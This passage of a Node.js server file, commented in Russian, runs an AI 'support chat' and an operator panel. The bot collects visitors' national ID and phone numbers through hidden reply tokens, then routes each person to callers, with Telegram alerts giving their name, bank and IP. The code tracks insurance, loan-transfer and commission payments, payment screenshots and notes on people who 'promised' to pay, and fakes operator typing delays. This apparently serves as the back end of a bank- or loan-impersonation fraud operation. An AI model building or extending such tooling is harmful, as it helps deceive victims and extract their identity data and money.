    if (!lead.aiEnabled) {
      if (message) {
        const saved = await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
        queueTranslation(saved); // фоновый перевод для чат-оператора, доставку не блокирует
      }
      return reply.send({ reply: '' });
    }

    // Block AI for sessions that haven't passed captcha (проверяем и БД — переживает рестарт)
    if (!(await hasCaptchaPassed(sessionId))) {
      if (message) {
        const saved = await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
        queueTranslation(saved);
      }
      return reply.send({ reply: '' });
    }

    const cfg = await getBotConfig();
    if (!cfg.aiEnabled) {
      return reply.send({ reply: '', disabled: true });
    }

    if (message) {
      const saved = await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
      queueTranslation(saved);
    }

    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      take: cfg.historyLimit,
    });

    if (start && !message) {
      const last = [...history].reverse().find((m) => m.role === 'ASSISTANT');
      if (last) return reply.send({ reply: last.content });
    }

    const rawPrompt = (await readChatPromptFile()) || 'Ты специалист поддержки. Помоги клиенту.';
    const system = buildSystemPrompt(rawPrompt, { name, bank });

    const msgs = [{ role: 'system', content: system }];
    for (const m of history) {
      if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
      else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
    }
    if (start && history.length === 0) {
      msgs.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни диалог.]' });
    }

    const rawReply = await aiChat(msgs, {
      provider: cfg.provider,
      model: cfg.model,
      temperature: cfg.temperature,
      maxTokens: cfg.maxTokens,
      tgRequestLogging: cfg.tgRequestLogging,
      trace: { source: 'chat.html (/api/support-chat)', sessionId, leadId: lead.id, clientName: name },
    });

    // Extract hidden tokens from second chat (DNI and PHONE).
    // Регулярки терпимы к пробелам после двоеточия и внутри значения.
    const dniMatch2   = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
    const phoneMatch2 = rawReply.match(/\[\[PHONE:\s*([0-9+][0-9+\-() ]{4,24})\]\]/i);
    const extractedDni2   = dniMatch2   ? dniMatch2[1].replace(/[\s\-]/g, '').toUpperCase() : null;
    const extractedPhone2 = phoneMatch2 ? phoneMatch2[1].replace(/[^0-9+]/g, '') : null;

    // Уже собранные данные подтягиваем из БД: dni/phone копятся между сообщениями,
    // поэтому «готовность» надо считать по накопленному, а не только по текущему ответу.
    let storedSub = {};
    try {
      const existingClient = await prisma.webClient.findUnique({
        where: { flowSessionId: sessionId },
        select: { submissionData: true },
      });
      storedSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
        ? existingClient.submissionData : {};
    } catch (e) {
      console.error('[support-chat] read submissionData error:', e?.message);
    }
    const mergedDni   = extractedDni2   || storedSub.dni   || null;
    const mergedPhone = extractedPhone2 || storedSub.phone || null;

    // Диалог завершён, если модель прислала [[DONE]] ИЛИ уже собраны оба обязательных
    // поля (DNI + телефон). Модель периодически «забывает» токен [[DONE]] в финальном
    // сообщении — без этой подстраховки передача оператору не срабатывала, ИИ не
    // отключался и по кругу просил DNI. Оба поля попадают в storedSub только через
    // валидные токены [[DNI]]/[[PHONE]], так что авто-завершение не сработает раньше.
    const doneByToken = rawReply.includes('[[DONE]]');
    const isDone = doneByToken || (!!mergedDni && !!mergedPhone);
    if (isDone && !doneByToken) {
      console.log(`[support-chat] авто-DONE по собранным данным (модель не прислала [[DONE]]) session=${sessionId}`);
    }

    const replyText = rawReply
      .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
      .replace(/\[\[PHONE:[^\]]*\]\]/gi, '')
      .replace(/\[\[DONE\]\]/g, '')
      .trim();

    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
    // Статистика: первый ответ бота-2 = «Бот2 начал диалог» (только аналитика, поведение не меняется)
    if (!history.some((m) => m.role === 'ASSISTANT')) {
      createWebEvent(sessionId, null, 'tourist_bot2_started');
    }
    // Schedule push if client doesn't reply within configured delay
    schedulePush(sessionId);

    // Save DNI/PHONE to webClient.submissionData immediately when extracted
    if (extractedDni2 || extractedPhone2) {
      try {
        const newSub = { ...storedSub };
        if (extractedDni2)   newSub.dni   = extractedDni2;
        if (extractedPhone2) newSub.phone = extractedPhone2;
        await upsertWebClient(sessionId, { submissionData: newSub });
      } catch (e) {
        console.error('[support-chat] token save error:', e?.message);
      }
    }

    if (isDone) {
      // Статистика: «Бот2 закончил диалог» (только аналитика)
      createWebEvent(sessionId, null, 'tourist_bot2_finished');
      // Disable further AI replies for this lead
      await prisma.lead.update({ where: { id: lead.id }, data: { aiEnabled: false } });

      // Mark webClient as call-requested so they appear in caller panel
      const ip = getClientIp(req);
      const country = getGeoFromHeaders(req)?.country || '';
      let nombre = name;
      let bank_ = bank;
      try {
        const wc = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { nombre: true, bank: true, submissionData: true },
        });
        if (wc) {
          nombre = nombre || wc.nombre || '';
          bank_ = bank_ || wc.bank || '';
        }
      } catch { /* non-fatal */ }

      try {
        await prisma.webClient.upsert({
          where: { flowSessionId: sessionId },
          create: {
            flowSessionId: sessionId,
            callRequested: true,
            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
            ip: ip || '',
            ...(nombre ? { nombre } : {}),
            ...(bank_ ? { bank: bank_ } : {}),
          },
          update: {
            callRequested: true,
            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
            ip: ip || '',
            ...(nombre ? { nombre } : {}),
            ...(bank_ ? { bank: bank_ } : {}),
          },
        });
      } catch (wcErr) {
        console.error('[support-chat] upsertWebClient failed:', wcErr?.message || wcErr);
      }
      await createWebEvent(sessionId, null, 'tourist_call_requested', { bank: bank_ || null, ip: ip || null });

      const lines = [
        '*💬 КЛИЕНТ ЗАКОНЧИЛ ЧАТ (передан оператору)*',
        `Session: \`${sessionId}\``,
        nombre ? `Имя: *${nombre}*` : '',
        bank_ ? `Банк: *${bank_}*` : '',
        `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
      ].filter(Boolean);
      sendToTelegram(lines.join('\n'));
      // Уведомляем прозвонщика/чат-оператора по SSE — новый заказ появляется без ручного обновления
      broadcastUpdate('clients_changed');
    }

    const extra2 = {};
    if (extractedDni2)   extra2.collectedDni   = extractedDni2;
    if (extractedPhone2) extra2.collectedPhone = extractedPhone2;
    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra2 });
  } catch (err) {
    console.error('[support-chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'chat_failed' });
  }
}

async function handleSupportChatHistory(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  reply.header('Cache-Control', 'no-store');
  if (!sessionId) return reply.send({ messages: [], pending: [], closed: false });
  const lead = await prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } });
  if (!lead) return reply.send({ messages: [], pending: [], closed: false });
  let history;
  try {
    history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      select: { id: true, role: true, content: true, deliverAt: true, typingMs: true },
    });
  } catch (e) {
    if (e?.code !== 'P2022') throw e; // нет колонок задержки — отдаём всё сразу
    history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      select: { id: true, role: true, content: true },
    });
  }

  // Сообщения оператора с deliverAt в будущем клиенту ещё не показываем: они
  // уезжают в pending, откуда чат сам разыграет анимацию и покажет их вовремя.
  // Побочно это держит счётчик непрочитанных честным на других страницах.
  const now = Date.now();
  const messages = [];
  const pending = [];
  for (const m of history) {
    const deliverAt = m.deliverAt ? new Date(m.deliverAt).getTime() : 0;
    if (m.role === 'SYSTEM' && deliverAt > now) {
      pending.push({
        id: m.id,
        content: m.content,
        deliverInMs: deliverAt - now,
        typingMs: Math.min(deliverAt - now, m.typingMs || TYPING_MIN_MS),
      });
    } else {
      messages.push({ id: m.id, role: m.role.toLowerCase(), content: m.content });
    }
  }
  return reply.send({ messages, pending, closed: !lead.aiEnabled });
}

async function handleGetChatPrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const prompt = await readChatPromptFile();
  return reply.send({ chatPrompt: prompt });
}

async function handleUpdateChatPrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    if (typeof body.chatPrompt !== 'string') return reply.status(400).send({ error: 'chatPrompt required' });
    const prompt = sanitizeString(body.chatPrompt, 20000).replace(/\r\n/g, '\n');
    await writeFile(CHAT_PROMPT_FILE, prompt.endsWith('\n') ? prompt : prompt + '\n', 'utf8');
    return reply.send({ chatPrompt: prompt });
  } catch (err) {
    console.error('[admin] update chat-prompt error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// Промпт перевода входящих сообщений (фоновый переводчик для чат-оператора).
async function handleGetTranslatePrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  let prompt = '';
  try { prompt = (await readFile(TRANSLATE_PROMPT_FILE, 'utf8')).trim(); } catch { /* нет файла */ }
  return reply.send({ translatePrompt: prompt || DEFAULT_TRANSLATE_PROMPT });
}

async function handleUpdateTranslatePrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    if (typeof body.translatePrompt !== 'string') return reply.status(400).send({ error: 'translatePrompt required' });
    const prompt = sanitizeString(body.translatePrompt, 20000).replace(/\r\n/g, '\n');
    await writeFile(TRANSLATE_PROMPT_FILE, prompt.endsWith('\n') ? prompt : prompt + '\n', 'utf8');
    return reply.send({ translatePrompt: prompt });
  } catch (err) {
    console.error('[admin] update translate-prompt error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Chat operator (chat/index.html)
// ─────────────────────────────────────────────────────────────────────────────

// Пока на сервере не выполнен `npx prisma db push`, колонки Message.translation в БД нет —
// запросы с ней падают (P2022 или validation error клиента). Повторяем запрос без перевода,
// чтобы панель оператора продолжала показывать сообщения.
function isMissingTranslationColumn(e) {
  return e?.code === 'P2022' || /translation/i.test(e?.message || '');
}

function requireChatOp(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || !sessionValid(chatOpSessions, token)) {
    reply.status(401).send({ error: 'unauthorized' });
    return false;
  }
  return true;
}

// ── Общие заметки чат-операторов (CRUD, на сервере) ───────────────────────────
async function handleGetNotes(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const myHandlerId = chatOpHandlerId(req);
  const all = await readNotes();
  // DB-оператор видит только свои заметки; all-access (.env) — все.
  const notes = myHandlerId ? all.filter((n) => n.handlerId === myHandlerId) : all;
  return reply.send({ notes });
}

// Может ли текущий чат-оператор менять/удалять заметку (своя или .env all-access).
function canEditNote(req, note) {
  const myHandlerId = chatOpHandlerId(req);
  if (!myHandlerId) return true;            // .env all-access
  return note.handlerId === myHandlerId;
}

function normalizePromiseDate(value) {
  const raw = sanitizeString(getString(value), 20);
  if (!raw) return null;
  if (!/^\d{4}-\d{2}-\d{2}$/.test(raw)) return null;
  const d = new Date(`${raw}T00:00:00Z`);
  if (Number.isNaN(d.getTime())) return null;
  return d.toISOString().slice(0, 10) === raw ? raw : null;
}

async function handleCreateNote(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const text = sanitizeString(getString(body.text), 4000);
    if (!text) return reply.status(400).send({ error: 'text required' });
    // Привязка к чату, из которого писали заметку (для ссылки в списке)
    const sessionId = sanitizeString(getString(body.sessionId), 80) || null;
    const clientName = sanitizeString(getString(body.clientName), 200) || null;
    const hasPromiseDate = Object.prototype.hasOwnProperty.call(body, 'promiseDate');
    const normalizedPromiseDate = normalizePromiseDate(body.promiseDate);
    if (hasPromiseDate && !normalizedPromiseDate) {
      return reply.status(400).send({ error: 'bad promiseDate' });
    }
    const promiseDate = normalizedPromiseDate || new Date().toISOString().slice(0, 10);
    const notes = await readNotes();
    const now = new Date().toISOString();
    notes.unshift({ id: randomUUID(), text, sessionId, clientName, promiseDate, handlerId: chatOpHandlerId(req), createdAt: now, updatedAt: now });
    await writeNotes(notes);
    // Оператору возвращаем только его заметки.
    const myHandlerId = chatOpHandlerId(req);
    return reply.send({ notes: myHandlerId ? notes.filter((n) => n.handlerId === myHandlerId) : notes });
  } catch (err) {
    console.error('[notes] create error:', err?.message || err);
    return reply.status(500).send({ error: 'create_failed' });
  }
}

async function handleUpdateNote(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const id = sanitizeString(getString(req.params.id), 80);
    const body = asRecord(req.body) ?? {};
    const text = sanitizeString(getString(body.text), 4000);
    if (!text) return reply.status(400).send({ error: 'text required' });
    const notes = await readNotes();
    const note = notes.find((n) => n.id === id);
    if (!note) return reply.status(404).send({ error: 'not_found' });
    if (!canEditNote(req, note)) return reply.status(403).send({ error: 'forbidden' });
    const promiseDate = Object.prototype.hasOwnProperty.call(body, 'promiseDate')
      ? normalizePromiseDate(body.promiseDate)
      : undefined;
    if (Object.prototype.hasOwnProperty.call(body, 'promiseDate') && !promiseDate) {
      return reply.status(400).send({ error: 'bad promiseDate' });
    }
    note.text = text;
    if (promiseDate) note.promiseDate = promiseDate;
    note.updatedAt = new Date().toISOString();
    await writeNotes(notes);
    const myHandlerId = chatOpHandlerId(req);
    return reply.send({ notes: myHandlerId ? notes.filter((n) => n.handlerId === myHandlerId) : notes });
  } catch (err) {
    console.error('[notes] update error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

async function handleDeleteNote(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const id = sanitizeString(getString(req.params.id), 80);
    const all = await readNotes();
    const target = all.find((n) => n.id === id);
    if (target && !canEditNote(req, target)) return reply.status(403).send({ error: 'forbidden' });
    const notes = all.filter((n) => n.id !== id);
    await writeNotes(notes);
    const myHandlerId = chatOpHandlerId(req);
    return reply.send({ notes: myHandlerId ? notes.filter((n) => n.handlerId === myHandlerId) : notes });
  } catch (err) {
    console.error('[notes] delete error:', err?.message || err);
    return reply.status(500).send({ error: 'delete_failed' });
  }
}

// ── Обещуны (заметки-календарь) для админки: все операторы, добавление на любого ─
async function handleAdminGetNotes(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const [notes, handlers] = await Promise.all([
      readNotes(),
      prisma.handler.findMany({ select: { id: true, name: true } }).catch(() => []),
    ]);
    const nameById = new Map(handlers.map((h) => [h.id, h.name]));
    const enriched = notes.map((n) => ({
      ...n,
      handlerName: n.handlerId ? (nameById.get(n.handlerId) || '—') : 'Общий',
    }));
    return reply.send({ notes: enriched });
  } catch (err) {
    console.error('[admin-notes] get error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminCreateNote(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const text = sanitizeString(getString(body.text), 4000);
    if (!text) return reply.status(400).send({ error: 'text required' });
    const handlerId = body.handlerId ? sanitizeString(getString(body.handlerId), 40) : null;
    const clientName = sanitizeString(getString(body.clientName), 200) || null;
    const normalizedPromiseDate = normalizePromiseDate(body.promiseDate);
    if (Object.prototype.hasOwnProperty.call(body, 'promiseDate') && !normalizedPromiseDate) {
      return reply.status(400).send({ error: 'bad promiseDate' });
    }
    const promiseDate = normalizedPromiseDate || new Date().toISOString().slice(0, 10);
    const notes = await readNotes();
    const now = new Date().toISOString();
    notes.unshift({ id: randomUUID(), text, sessionId: null, clientName, promiseDate, handlerId, createdAt: now, updatedAt: now });
    await writeNotes(notes);
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin-notes] create error:', err?.message || err);
    return reply.status(500).send({ error: 'create_failed' });
  }
}

async function handleAdminDeleteNote(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(getString(req.params.id), 80);
    const notes = (await readNotes()).filter((n) => n.id !== id);
    await writeNotes(notes);
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin-notes] delete error:', err?.message || err);
    return reply.status(500).send({ error: 'delete_failed' });
  }
}

async function handleChatOpLogin(req, reply) {
  if (rateLimited(req, reply, 'login-chatop', 10, 5 * 60 * 1000)) return;
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);

  // 1) .env-логин — all-access (handlerId = null, видит все лиды).
  let handlerId = null;
  let matched = safeEqual(login, config.chatOp.login) && safeEqual(password, config.chatOp.password);

  // 2) Иначе — учётка обработчика из БД (активная).
  if (!matched) {
    try {
      const handler = await prisma.handler.findUnique({ where: { login } });
      if (handler && handler.active && safeEqual(handler.password, password)) {
        matched = true;
        handlerId = handler.id;
      }
    } catch { /* таблицы может не быть до миграции — считаем как неверный логин */ }
  }

  if (!matched) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }

  rateReset(req, 'login-chatop');
  const token = randomUUID() + randomUUID();
  sessionAdd(chatOpSessions, token);
  chatOpHandlers.set(token, handlerId);
  saveSessions();
  return reply.send({ token, handlerId });
}

async function handleChatOpClients(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const visibleOr = [{ operatorCalled: true }, { status: 'ЧАТ: НУЖЕН ЗВОНОК' }, { status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)' }, { status: 'ЧАТ: АКТИВЕН' }];
    // Обработчик (DB-логин) видит свои лиды; .env all-access — все.
    // Плюс те, что вёл раньше (история привязок) — чтобы после передачи лида
    // не терять свою переписку и уметь свериться со своей статистикой.
    const myHandlerId = chatOpHandlerId(req);
    const mine = [
      { handlerId: myHandlerId },
      { assignments: { some: { handlerId: myHandlerId } } },
    ];
    const where = myHandlerId
      ? { AND: [{ OR: mine }, { OR: visibleOr }] }
      : { OR: visibleOr };
    const clients = await prisma.webClient.findMany({
      where,
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true, flowSessionId: true, nombre: true, email: true, bank: true,
        ip: true, status: true, callerNote: true, submissionData: true, clientType: true,
        calledAt: true, createdAt: true, updatedAt: true,
        callRequested: true, operatorCalled: true, balance: true, transactions: true,
        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
      },
    });
    const enriched = await Promise.all(clients.map(async (c) => {
      try {
        const lead = await prisma.lead.findUnique({
          where: { tgId: chatLeadKey(c.flowSessionId) },
          select: { id: true, aiEnabled: true },
        });
        let lastMsg = null;
        let unreadCount = 0;
        let hasPhoto = false;
        if (lead) {
          let last;
          try {
            last = await prisma.message.findFirst({
              where: { leadId: lead.id },
              orderBy: { createdAt: 'desc' },
              select: { role: true, content: true, translation: true, createdAt: true },
            });
          } catch (e) {
            if (!isMissingTranslationColumn(e)) throw e;
            last = await prisma.message.findFirst({
              where: { leadId: lead.id },
              orderBy: { createdAt: 'desc' },
              select: { role: true, content: true, createdAt: true },
            });
          }
          if (last) {
            const role = last.content === 'CALLER_ACTION_BUTTONS'
              ? 'user'
              : last.role === 'SYSTEM' ? 'operator' : last.role.toLowerCase();
            lastMsg = { role, content: last.content, translation: last.translation || null, createdAt: last.createdAt };
          }
          // Кол-во сообщений клиента (USER) после последнего сообщения оператора (SYSTEM) — как непрочитанные в TG.
          const lastOp = await prisma.message.findFirst({
            where: { leadId: lead.id, role: 'SYSTEM' },
            orderBy: { createdAt: 'desc' },
            select: { createdAt: true },
          });
          unreadCount = await prisma.message.count({
            where: {
              leadId: lead.id,
              role: 'USER',
              ...(lastOp ? { createdAt: { gt: lastOp.createdAt } } : {}),
            },
          });
          // Есть ли в чате хоть одно фото (загруженное изображение или скриншот оплаты).
          const photoMsg = await prisma.message.findFirst({
            where: {
              leadId: lead.id,
              OR: [
                { content: { startsWith: '/uploads/' } },
                { content: { startsWith: 'PAYMENT_SCREENSHOT' } },
              ],
            },
            select: { id: true },
          });
          hasPhoto = !!photoMsg;
        }
        return {
          ...c,
          lastMsg,
          unreadCount,
          hasPhoto,
          paymentPending: hasPendingPayment(c.flowSessionId),
          requisiteStatus: getRequisiteStatus(c.flowSessionId),
        };
      } catch {
        return {
          ...c,
          lastMsg: null,
          unreadCount: 0,
          hasPhoto: false,
          paymentPending: false,
          requisiteStatus: getRequisiteStatus(c.flowSessionId),
        };
      }
    }));
    const activityTime = (c) => {
      const raw = c.lastMsg?.createdAt || c.calledAt || c.createdAt;
      const t = raw ? new Date(raw).getTime() : 0;
      return Number.isFinite(t) ? t : 0;
    };
    const chatPriority = (c) => {
      if (c.status === 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)') return 0;
      if (c.lastMsg?.role === 'user') return 1;
      return 2;
    };
    enriched.sort((a, b) => {
      const byPriority = chatPriority(a) - chatPriority(b);
      return byPriority || activityTime(b) - activityTime(a);
    });
    return reply.send({ clients: enriched });
  } catch (err) {
    console.error('[chat-op/clients]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Операторское текстовое сообщение (не маркер/картинка/скрин) — только такое можно править.
function isEditableOperatorText(content) {
  if (typeof content !== 'string' || !content.trim()) return false;
  if (content === 'CALLER_ACTION_BUTTONS' || content === 'OFFER_BUTTONS') return false;
  if (content.startsWith('/uploads/') || content.startsWith('http')) return false;
  if (content.startsWith('PAYMENT_SCREENSHOT')) return false;
  if (/^\[\[[A-Z_]+/.test(content)) return false; // маркеры вида [[CONTRATO]], [[COMMISSION_PAY]]
  return true;
}

async function handleChatOpMessages(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  if (!sessionId) return reply.send({ messages: [], callerNote: null });
  try {
    const [lead, wc] = await Promise.all([
      prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } }),
      prisma.webClient.findUnique({ where: { flowSessionId: sessionId }, select: { callerNote: true, nombre: true, email: true, bank: true, ip: true, submissionData: true } }),
    ]);
    if (!lead) return reply.send({ messages: [], callerNote: wc?.callerNote || null, client: wc });
    let history;
    let translationReady = true; // колонка translation уже есть в БД
    try {
      history = await prisma.message.findMany({
        where: { leadId: lead.id },
        orderBy: { createdAt: 'asc' },
        select: { id: true, role: true, content: true, translation: true, createdAt: true, senderHandlerId: true, editedAt: true, editHistory: true, deliverAt: true },
      });
    } catch (e) {
      // Нет какой-то из новых колонок (translation/edit*) — откатываемся на минимальный набор.
      if (!isMissingTranslationColumn(e) && e?.code !== 'P2022') throw e;
      translationReady = false;
      history = await prisma.message.findMany({
        where: { leadId: lead.id },
        orderBy: { createdAt: 'asc' },
        select: { id: true, role: true, content: true, createdAt: true },
      });
    }
    // Catch-up: если ИИ был недоступен в момент прихода сообщения, перевод остался пустым —
    // дозаказываем его в фоне при открытии чата (следующий poll уже покажет перевод).
    if (translationReady) {
      for (const m of history) {
        if (m.role === 'USER' && !m.translation && isTranslatable(m.content)) queueTranslation(m);
      }
    }
    const sub = (wc?.submissionData && typeof wc.submissionData === 'object') ? wc.submissionData : {};
    const myHandlerId = chatOpHandlerId(req);
    return reply.send({
      messages: history.map((m) => ({
        id: m.id,
        role: m.role === 'SYSTEM' ? 'operator' : m.role.toLowerCase(),
        content: m.content,
        translation: m.translation || null,
        createdAt: m.createdAt,
        deliverAt: m.deliverAt || null,
        editedAt: m.editedAt || null,
        history: Array.isArray(m.editHistory) ? m.editHistory : [],
        // Править может только отправитель-менеджер; .env all-access (myHandlerId=null) — любое операторское.
        canEdit: m.role === 'SYSTEM' && isEditableOperatorText(m.content) && (myHandlerId ? m.senderHandlerId === myHandlerId : true),
      })),
      callerNote: wc?.callerNote || null,
      chatLastReadAt: sub.chatLastReadAt || null,
      client: wc,
      paymentStatus: getPaymentStatus(sessionId, 'insurance').status,
      paymentStatuses: {
        insurance: getPaymentStatus(sessionId, 'insurance').status,
        return: getPaymentStatus(sessionId, 'return').status,
        loantransfer: getPaymentStatus(sessionId, 'loantransfer').status,
        creditcard: getPaymentStatus(sessionId, 'creditcard').status,
      },
    });
  } catch (err) {
    console.error('[chat-op/messages]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSend(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const message = sanitizeString(getString(body.message), 4000);
    if (!sessionId || !message) return reply.status(400).send({ error: 'missing fields' });
    const key = chatLeadKey(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key },
      update: {},
    });
    await createOperatorMessage(lead.id, message, chatOpHandlerId(req));
    await prisma.webClient.updateMany({
      where: { flowSessionId: sessionId, status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)' },
      data: { status: 'ЧАТ: АКТИВЕН' },
    });

    // Start (кнопка чат-оператора) = маркер CALLER_ACTION_BUTTONS → фиксируем когорту:
    // проставляем assignedAt (если ещё пусто) и handlerId (сессия или routing-цель).
    if (message === 'CALLER_ACTION_BUTTONS') {
      try {
        const wc = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { assignedAt: true, handlerId: true },
        });
        if (wc && !wc.assignedAt) {
          let handlerId = chatOpHandlerId(req);
          if (!handlerId) {
            handlerId = wc.handlerId || (await readSettings()).routingHandlerId || null;
          }
          const assignedAt = new Date();
          const updated = await prisma.webClient.update({
            where: { flowSessionId: sessionId },
            data: { assignedAt, ...(handlerId ? { handlerId } : {}) },
            select: { id: true, handlerId: true },
          });
          // Первый интервал истории = старт когорты (та же дата, что assignedAt).
          await openAssignmentInterval(updated.id, updated.handlerId, assignedAt);
        }
      } catch (e) {
        console.error('[chat-op/send] assign cohort error:', e?.message);
      }
    }

    // Schedule push notification if client doesn't respond within configured delay
    schedulePush(sessionId);
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/send]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Правка операторского сообщения — только отправителем (или .env all-access).
async function handleChatOpEditMessage(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const id = sanitizeString(getString(req.params.id), 40);
    const body = asRecord(req.body) ?? {};
    const content = sanitizeString(getString(body.content), 4000);
    if (!id) return reply.status(400).send({ error: 'id required' });
    if (!content) return reply.status(400).send({ error: 'content required' });

    let msg;
    try {
      msg = await prisma.message.findUnique({
        where: { id },
        select: { id: true, role: true, content: true, senderHandlerId: true, editHistory: true },
      });
    } catch (e) {
      if (e?.code === 'P2022') return reply.status(500).send({ error: 'migration_required' });
      throw e;
    }
    if (!msg) return reply.status(404).send({ error: 'not_found' });
    if (msg.role !== 'SYSTEM' || !isEditableOperatorText(msg.content)) {
      return reply.status(400).send({ error: 'not_editable' });
    }
    const myHandlerId = chatOpHandlerId(req);
    if (myHandlerId && msg.senderHandlerId !== myHandlerId) {
      return reply.status(403).send({ error: 'forbidden' }); // не свой — нельзя
    }

    const history = Array.isArray(msg.editHistory) ? msg.editHistory : [];
    // Пишем прежнюю версию + кто делает эту правку (by — handlerId редактора, null = .env/админ).
    history.push({ content: msg.content, at: new Date().toISOString(), by: myHandlerId || null });
    if (history.length > 30) history.splice(0, history.length - 30);

    await prisma.message.update({
      where: { id },
      data: { content, editedAt: new Date(), editHistory: history },
    });
    return reply.send({ ok: true, id, content, editedAt: new Date().toISOString(), history });
  } catch (err) {
    console.error('[chat-op/message-edit]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Список изменённых операторами сообщений (для раздела в админке).
async function handleAdminGetEditedMessages(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    let msgs;
    try {
      msgs = await prisma.message.findMany({
        where: { editedAt: { not: null } },
        orderBy: { editedAt: 'desc' },
        take: 300,
        select: { id: true, content: true, editedAt: true, editHistory: true, senderHandlerId: true, createdAt: true, lead: { select: { tgId: true } } },
      });
    } catch (e) {
      if (e?.code === 'P2022') return reply.send({ messages: [] }); // колонок ещё нет (нет миграции)
      throw e;
    }
    const handlerIds = new Set();
    const sessionIds = [];
    for (const m of msgs) {
      if (m.senderHandlerId) handlerIds.add(m.senderHandlerId);
      (Array.isArray(m.editHistory) ? m.editHistory : []).forEach((h) => { if (h && h.by) handlerIds.add(h.by); });
      const tg = m.lead?.tgId || '';
      if (tg.startsWith('chat:')) sessionIds.push(tg.slice('chat:'.length));
    }
    const [handlers, clients] = await Promise.all([
      handlerIds.size ? prisma.handler.findMany({ where: { id: { in: [...handlerIds] } }, select: { id: true, name: true } }).catch(() => []) : [],
      sessionIds.length ? prisma.webClient.findMany({ where: { flowSessionId: { in: sessionIds } }, select: { flowSessionId: true, nombre: true, email: true } }).catch(() => []) : [],
    ]);
    const hName = new Map(handlers.map((h) => [h.id, h.name]));
    const cName = new Map(clients.map((c) => [c.flowSessionId, c.nombre || c.email || '']));
    const nameOf = (id) => (id ? (hName.get(id) || '—') : '.env / админ');

    const list = msgs.map((m) => {
      const tg = m.lead?.tgId || '';
      const sessionId = tg.startsWith('chat:') ? tg.slice('chat:'.length) : '';
      const hist = Array.isArray(m.editHistory) ? m.editHistory : [];
      const lastEntry = hist.length ? hist[hist.length - 1] : null;
      const lastBy = (lastEntry && 'by' in lastEntry) ? lastEntry.by : (m.senderHandlerId || null);
      return {
        id: m.id,
        sessionId,
        clientName: cName.get(sessionId) || '',
        senderName: nameOf(m.senderHandlerId),
        editorName: nameOf(lastBy),
        content: m.content,
        editedAt: m.editedAt,
        history: hist.map((h) => ({ content: h && h.content, at: (h && h.at) || null, byName: nameOf(h && h.by) })),
      };
    });
    return reply.send({ messages: list });
